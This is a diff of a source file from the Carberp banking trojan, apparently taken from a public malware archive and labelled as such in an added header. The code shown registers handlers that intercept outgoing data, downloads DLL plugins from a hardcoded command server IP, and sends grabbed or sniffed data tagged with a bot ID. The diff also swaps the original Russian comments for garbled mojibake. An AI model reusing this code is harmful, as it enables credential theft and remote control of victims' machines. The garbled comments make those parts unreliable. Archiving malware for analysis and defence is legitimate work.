@@ -1,3 +1,14 @@
+/*
+  name      Carberp
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <winsock2.h>
 #include <windows.h>
 #include <wininet.h>
@@ -25,24 +36,24 @@
 
 typedef struct TSendDataHandler
 {
-	PCHAR HandleURL;       // Адрес который необходимо обработать
-	PCHAR URL; 			   // Рабочий адрес
-	PSendDataEvent Event;  // Событие обработки
-	THandleDataMode Mode;  // Режим обработки
+	PCHAR HandleURL;       // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	PCHAR URL; 			   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	PSendDataEvent Event;  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	THandleDataMode Mode;  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 } *PSendDataHandler;
 
 
 
 
-// Список зарегистрированных обработчиков отправки данных
-HANDLE SendHandlersTID = NULL;  //  Инициализауию глобальных данных буднм
-				        	   //  привязывать к идентификатору потока
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+HANDLE SendHandlersTID = NULL;  //  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+				        	   //  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 PList SendDataHandlers = NULL;
 
 
 void DestroyDataHandler(LPVOID Data)
 {
-	// Уничтожить данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PSendDataHandler H =  (PSendDataHandler)Data;
 	STR::Free(H->HandleURL);
 	STR::Free(H->URL);
@@ -52,8 +63,8 @@ void DestroyDataHandler(LPVOID Data)
 
  void InitializeHandlersList()
 {
-	// Инициализацию списка перехватчиков производим в случее еслт
-	// он не создал либо создан в другом процессе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE TID = pGetCurrentThreadId();
 
 	if (SendDataHandlers == NULL || SendHandlersTID != TID)
@@ -67,7 +78,7 @@ void DestroyDataHandler(LPVOID Data)
 
 DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL)
 {
-	// Зарегистрировать обработчик отправки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Event == NULL && Mode == hdmUnknown)
 		return 0;
 
@@ -169,10 +180,10 @@ typedef struct
 //----------------------------------------------------------------------------
 LPVOID DownloadPlugin(PCHAR URL, DWORD *ModuleSize)
 {
-	// Функция загружает плагин (DLL)
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (DLL)
 	PCHAR Buf = NULL;
 
-	// Функция считаевает файл по адресу URL в буФер Buf
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL пїЅ пїЅпїЅпїЅпїЅпїЅ Buf
 		if (URL == NULL)
 			return false;
 #ifdef _DEBUG
@@ -212,9 +223,9 @@ LPVOID DownloadPlugin(PCHAR URL, DWORD *ModuleSize)
 //----------------------------------------------------------------------------
 LPVOID DownloadPluginFromPath(PCHAR Path, DWORD *ModuleSize)
 {
-	// Функция загружает с сервера плагин (DLL)
-	//	Path - относительный путь к плагину. Должен начинаться с
-	//        обратного слеша /
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (DLL)
+	//	Path - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ
+	//        пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ /
 	if (STR::IsEmpty(Path)) return NULL;
 
 	PCHAR Host = "178.63.11.137"/**"94.240.148.127"*/;//GetCurrentHost2();
@@ -499,7 +510,7 @@ bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
 	if (STR::IsEmpty(URL) || Buf == NULL || BufSize == 0)
 		return false;
 
-	// Собираем  данные сниффера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR BotID = GenerateBotID();
 
